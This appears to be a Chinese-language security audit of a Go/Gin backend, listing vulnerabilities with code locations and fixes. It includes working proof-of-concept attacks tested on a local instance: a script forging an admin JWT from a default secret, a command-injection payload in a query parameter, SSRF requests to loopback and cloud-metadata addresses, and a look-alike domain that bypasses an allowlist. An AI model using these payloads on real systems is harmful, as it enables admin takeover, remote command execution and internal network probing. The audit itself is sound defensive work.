## 二、P0 · 立即修复（可被远程利用）

### P0-1　JWT 默认密钥未拦截 → 任意伪造 admin 令牌（已实测成功）

**位置**
- `backend/.env:5` → `JWT_SECRET=your-jwt-secret-key-change-in-production`
- `backend/pkg/utils/jwt/jwt.go:32-35`
- `backend/internal/config/config.go:106` 默认值同样是该串

**问题**
代码的弱密钥黑名单只拦两个串：

```go
var weakSecretPlaceholders = map[string]struct{}{
	"your-secret-key-change-in-production": {},
	"your-jwt-secret-key-change-me":        {},
}
```

而 `.env` 实际写的是 `your-jwt-secret-key-change-in-production`（混了 `jwt`），**不在黑名单里**；长度 40 ≥ `minSecretLength=32`，于是 `ValidateSecret` 判定通过，`SetDefaultSecret` 正常装载，服务照常启动 —— 没有任何告警。

**实测证据**

用该密钥本地签发令牌（alg/iss 与代码一致，`Issuer = "go-gin-backend"`，HS256）：

```bash
TOK=$(python3 - <<'PY'
import hmac,hashlib,base64,json,time
b64=lambda b: base64.urlsafe_b64encode(b).rstrip(b'=')
secret=b"your-jwt-secret-key-change-in-production"
now=int(time.time())
hdr={"alg":"HS256","typ":"JWT"}
pl={"user_id":"attacker","username":"attacker","role":"admin","iss":"go-gin-backend",
    "iat":now,"nbf":now-1,"exp":now+86400}
m=b64(json.dumps(hdr,separators=(',',':')).encode())+b'.'+b64(json.dumps(pl,separators=(',',':')).encode())
print((m+b'.'+b64(hmac.new(secret,m,hashlib.sha256).digest())).decode())
PY
)
```

结果（三发三中）：

```
GET /api/storage?status=1   → 200 {"d1Available":true}
GET /api/user/profile       → 400 {"error":"用户ID格式错误"}   ← 已通过 AuthMiddleware，仅业务层 UUID 解析失败
GET /api/admin/users        → 200 {"data":[{"id":"d25e5a6b-...","username":"admin","role":"admin",...}]}
```

`/api/admin/users` 是挂了 `AuthMiddleware() + RoleBasedAuth([]string{"admin"})` 的最高权限路由，**用自签令牌拿到了全部用户列表**。若生产沿用同一份 `.env`，这是一个完整的管理员认证绕过。

**修复**

1. 立刻轮换 `JWT_SECRET`（`openssl rand -base64 48`），并让历史 token 全部失效（轮换即生效）。
2. 黑名单改成**前缀/模式匹配**而非精确匹配，例如拒绝包含 `change-in-production` / `change-me` / `your-` 的串：
   ```go
   var weakPatterns = []string{"your-", "change-in-production", "change-me", "changeme", "secret-key"}
   ```
3. 更稳的做法：生产环境**拒绝**从环境变量读取的密钥长度 < 32 或命中模式时直接 `panic`，而不是静默继续（`ValidateSecret` 已有能力，只是黑名单漏了）。
4. 服务启动时打印密钥指纹（如 `sha256(secret)[:8]`），便于发现"部署的密钥和预期不一致"。

### P0-2　`/proxy` 命令注入 → 远程任意命令执行（已实测拿到 shell 身份）

**位置**
- `backend/internal/handlers/solara_handler.go:290`、`:298` → `videoId := c.Query("id")`（无任何过滤）
- `:1888` / `:1912` → `fmt.Sprintf("... 'https://www.youtube.com/watch?v=%s' ...", videoId)` 直接拼进命令
- `:1927-1933` → `execShell` 用 `exec.CommandContext(ctx, "sh", "-c", cmd)`

**问题**
`videoId` 被单引号包裹，但**没有对值里的单引号做转义或剔除**，攻击者输入 `x'; <任意命令>; '` 即可闭合引号跳出上下文。同文件 `youtubeSearch` (`:1713-1716`) 做了一步 `strings.ReplaceAll(keyword, "'", "")`，说明作者知道这个风险，但两个取 URL 的函数漏了。

**实测证据**（本地实例，带合法 cookie 的路径）

```bash
curl --get --data-urlencode "source=youtube" \
     --data-urlencode "types=url" \
     --data-urlencode "id=x'; id > /tmp/inj_proof.txt; '" \
     "http://127.0.0.1:8080/proxy"
cat /tmp/inj_proof.txt
```

输出：

```
uid=501(aay) gid=20(staff) groups=20(staff),12(everyone),61(localaccounts),79(_appserverusr),80(admin),...
```

命令以**服务进程身份**执行成功。该分支仅需 `isAuthed`（弱口令可爆破，见 P0-4；`APP_PASSWORD` 为空时直接放行，见 P0-3），因此实际攻击链为：弱口令/空口令 → 命令注入 → 服务器沦陷。若容器内以 root 运行，即为容器内 root RCE。

**修复**
根本修法是**不要用 shell**：

```go
// 直接 exec，参数分离，shell 元字符彻底失效
cmd := exec.CommandContext(ctx, "yt-dlp",
    "--js-runtimes", "node",
    "--cookies", cookiesPath,
    "-f", "bestaudio[ext=m4a]/bestaudio",
    "--get-url", "https://www.youtube.com/watch?v="+videoId)
```

同时：
- 对 `videoId` 强制白名单校验 `^[A-Za-z0-9_-]{11}$`（YouTube ID 定长 11）；
- 若必须保留 `sh -c`，改成 `printf '%q'` 式转义或使用 `shellwords` 库，但优先级低于改用 `exec.Command`；
- 给 `execShell` 加 `Setpgid` + 超时后显式 kill 进程组，避免 `yt-dlp` 子进程泄漏。

### P0-5　`/imgproxy` 无鉴权、无域名白名单 → 任意 SSRF（已实测）

**位置**：`backend/internal/handlers/solara_handler.go:346-371`

```go
targetURL := c.Query("url")                  // 无校验
req, _ := http.NewRequestWithContext(ctx, "GET", targetURL, nil)
resp, _ := client.Do(req)                    // 无 allowlist
c.Header("Access-Control-Allow-Origin", "*") // 且回显给任意来源
```

**实测证据**

```bash
curl "http://127.0.0.1:8080/imgproxy?url=http://127.0.0.1:8080/health"
# → 200，完整返回内网 health 的 JSON（含依赖组件与内部错误信息）
curl "http://127.0.0.1:8080/imgproxy?url=http://169.254.169.254/latest/meta-data/"
# → 502（本机无元数据服务，但请求确实发往了链路本地地址，说明内网探测可达）
```

因为响应带 `Access-Control-Allow-Origin: *`，任意网页都能把它当**跨域内网探测器**用：`fetch('https://host/imgproxy?url=http://10.0.0.5:6379/')` 从浏览器侧直接扫内网端口。

**修复**
1. 加域名白名单（只允许 `*.music.126.net`、`p*.music.126.net` 等网易云图床），并**用 `parsed.Hostname()` 做精确后缀匹配**（见 P1-1 的错误示范）。
2. 解析后校验 IP 不属于私有网段/链路本地/回环：
   ```go
   if ip.IsLoopback() || ip.IsPrivate() || ip.IsLinkLocalUnicast() { reject }
   ```
   注意需在 DNS 解析后校验，否则可被 DNS rebinding 绕过。
3. 限制响应大小（`io.LimitReader(resp.Body, 10<<20)`）与 `Content-Type` 前缀（只放图片）。
4. `Access-Control-Allow-Origin` 收窄到自家域名。

### P1-1　`/proxy` 域名校验可被后缀域名绕过（SSRF / 开放代理）

**位置**：`backend/internal/handlers/solara_handler.go:424-431`

```go
case strings.HasSuffix(host, "kuwo.cn"):
case strings.HasSuffix(host, "bilivideo.com") || ... || strings.HasSuffix(host, "bilibili.com"): 
case strings.HasSuffix(host, "googlevideo.com"):
```

`HasSuffix("evilkuwo.cn", "kuwo.cn")` 为真 —— 攻击者注册 `evilkuwo.cn`、`notbilibili.com`、`fakegooglevideo.com` 即可让服务器把它们当合法源，配合 `:228-232` 的 **url 分支跳过 auth**，得到一个免认证的开放代理（可用来隐藏真实来源、做流量中继、绕 CDN 封禁）。

**实测**：`/proxy?url=http://evilkuwo.cn/x.mp3` → `502 {"error":"upstream request failed"}`（域名不存在，但**通过了 allowlist 检查并发起了外连**，证明绕过成立）。

**修复**：改用 `host == "kuwo.cn" || strings.HasSuffix(host, ".kuwo.cn")` 的精确写法（带前导点），或维护显式 host 集合。

### P1-2　`ContentType` 中间件误伤标准客户端

**位置**：`backend/internal/middlewares/security.go:58`

```go
if contentType != "" && contentType != "application/json" { → 415 }
```

未剥离 `; charset=utf-8` 等参数。**实测**：

```
Content-Type: application/json; charset=utf-8  → 415 {"error":"不支持的媒体类型"}
Content-Type: application/json                 → 401（正常走业务）
```

浏览器 `fetch` 默认发送带 charset 的 JSON，Python `requests`、部分 OkHttp 配置同样如此。这也直接导致 `/api/cookies/upload` 的 `multipart/form-data` 上传**永久 415** —— 该功能在当前代码下不可用。

**修复**：
```go
mt, _, err := mime.ParseMediaType(contentType)
// multipart/form-data 也需要放行（上传接口）
if err != nil || (mt != "application/json" && !strings.HasPrefix(mt, "multipart/")) { 415 }
```

### P1-4　Supabase pooler + pgx prepared statement 冲突，日志每 500ms 刷错

**位置**：`backend/internal/database/postgres.go:88`（DSN 已带 `prefer_simple_protocol=true`）+ Outbox 轮询 `PollInterval: 500ms`

**实测**（连真实 Supabase 时）：
```
[Outbox] 读取待发送事件失败: ERROR: prepared statement
"stmtcache_39a1fa4a22b1bd914f9a6208402a121079574a01db50b541" already exists (SQLSTATE 42P05)
```
同时 `SELECT CURRENT_DATABASE()` 等元数据查询出现 200-340ms 的 `SLOW SQL` 告警。

**影响**：日志被污染（`backend/logs` 已 85MB）、Outbox 实际不工作、迁移期元数据查询缓慢。

**修复**：DSN 增加 `default_query_exec_mode=simple_protocol`（pgx v5 写法）或 `statement_cache_capacity=0`；Supabase transaction mode pooler（6543）本身不支持 prepared statement 缓存，改用 session mode（5432）也可。同时把 Outbox 轮询间隔提到 2-5s，空轮询不该 500ms 一次。

### P1-6　凭据/文件处理缺少基本防护

- `UploadCookie` (`:1971-2008`)：`io.ReadAll(file)` 无大小上限（可上传数 GB 打满磁盘/内存），无内容格式校验，直接 `os.WriteFile(destPath, data, 0644)`；目标路径硬编码为 `/app/yt_cookies.txt`（`:1965-1966`），非容器环境必然失败。

**修复**：`io.LimitReader(file, 1<<20)`；key 白名单校验；路径改为可配置（`COOKIE_DIR`）并 `filepath.Join` + `filepath.Clean`；把 cookie 与 storage 按用户隔离（当前 JWT 是 `app_user` 单身份，需先引入真实用户模型）。
